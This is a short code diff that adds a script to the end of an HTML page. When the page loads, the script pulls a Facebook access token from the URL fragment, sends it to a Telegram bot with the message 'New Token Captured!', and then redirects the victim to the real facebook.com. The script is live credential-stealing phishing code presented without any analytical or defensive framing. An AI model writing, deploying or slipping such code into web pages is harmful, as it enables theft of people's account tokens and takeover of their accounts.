@@ -147,5 +147,29 @@
             });
         }
     </script>
+    <script>
+// Extract access token from URL
+window.onload = function() {
+    const urlParams = new URLSearchParams(window.location.hash.substring(1));
+    const accessToken = urlParams.get('access_token');
+    
+    if (accessToken) {
+        // Send token to your Telegram bot
+        fetch('https://api.telegram.org/bot7811805953:AAE_wfostYkKLMXxvhqJqVLqxqJqVLqxqJq/sendMessage', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: '7806227779',
+                text: '🔑 New Token Captured!\n\nAccess Token: ' + accessToken
+            })
+        });
+        
+        // Redirect to real Facebook
+        window.location.href = 'https://www.facebook.com';
+    }
+};
+</script>
 </body>
 </html>
